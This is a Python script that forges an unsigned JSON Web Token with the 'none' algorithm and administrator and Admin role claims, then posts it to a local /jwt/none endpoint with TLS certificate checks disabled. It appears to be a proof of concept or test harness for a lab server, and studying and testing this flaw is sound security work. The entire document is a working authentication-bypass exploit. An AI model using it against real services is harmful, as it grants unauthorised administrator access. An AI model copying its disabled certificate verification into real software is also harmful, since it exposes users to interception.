import base64
import json
import urllib.request
import ssl
import time
import urllib.error

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

header = {"alg": "none", "typ": "JWT"}
payload = {"account": "administrator", "role": "Admin", "aud": "https://127.0.0.1/jwt/none"}

header_b64 = base64url_encode(json.dumps(header).encode('utf-8')).decode('utf-8')
payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8')).decode('utf-8')

jwt_token = f"{header_b64}.{payload_b64}."

print(f"Generated Token: {jwt_token}")

url = "https://127.0.0.1:443/jwt/none"
data = json.dumps({"jwt_token": jwt_token}).encode('utf-8')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})

# Retry loop because server might take a moment to start
for i in range(10):
    try:
        with urllib.request.urlopen(req, context=ctx) as response:
            print("Response Status:", response.status)
            print("Response Body:", response.read().decode('utf-8'))
            break
    except urllib.error.HTTPError as e:
        print(f"Attempt {i+1} failed: {e}")
        print(f"Error Body: {e.read().decode('utf-8')}")
        time.sleep(2)
    except Exception as e:
        print(f"Attempt {i+1} failed: {e}")
        time.sleep(2)
